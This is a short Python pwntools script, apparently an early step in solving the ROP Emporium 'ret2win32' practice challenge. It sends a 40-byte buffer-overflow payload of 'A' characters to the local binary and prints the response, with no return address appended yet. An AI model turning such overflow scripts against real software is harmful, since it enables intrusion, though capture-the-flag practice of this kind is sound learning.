from pwn import *

c = process("./ret2win32")

payload = "A"*40

print c.recvuntil("> ")
c.sendline(payload)
print c.recvline()

c.close()
